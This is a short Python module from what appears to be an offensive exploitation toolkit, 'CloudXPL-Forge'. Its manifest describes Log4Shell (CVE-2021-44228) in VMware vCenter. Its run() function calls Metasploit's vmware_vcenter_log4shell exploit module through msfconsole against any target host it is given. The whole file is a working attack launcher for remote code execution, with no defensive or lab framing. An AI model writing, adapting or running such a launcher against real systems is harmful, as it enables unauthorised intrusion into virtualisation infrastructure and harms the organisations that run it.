"""CloudXPL-Forge — vCenter Log4Shell (CVE-2021-44228)."""

from __future__ import annotations

MANIFEST: dict = {
    "name": "vCenter Log4Shell (CVE-2021-44228)",
    "cve": "CVE-2021-44228",
    "mitre": ["T1190"],
    "description": "Exploits Log4j RCE (Log4Shell) in VMware vCenter Server. MSF module available.",
    "references": ["https://nvd.nist.gov/vuln/detail/CVE-2021-44228"],
}


import shutil
import subprocess
import sys


def run(args):
    msfconsole = shutil.which("msfconsole")
    if not msfconsole:
        print("[!] msfconsole not found — install Metasploit Framework", file=sys.stderr)
        return 1

    target = getattr(args, "target", None) or getattr(args, "vcenter_host", "") or ""
    cmd = [
        msfconsole, "-q", "-x",
        f"use exploit/multi/http/vmware_vcenter_log4shell; "
        + (f"set RHOSTS {target}; " if target else "")
        + "run; exit",
    ]
    if getattr(args, "verbose", False):
        print(f"[*] Running: {' '.join(cmd)}")
    return subprocess.call(cmd)
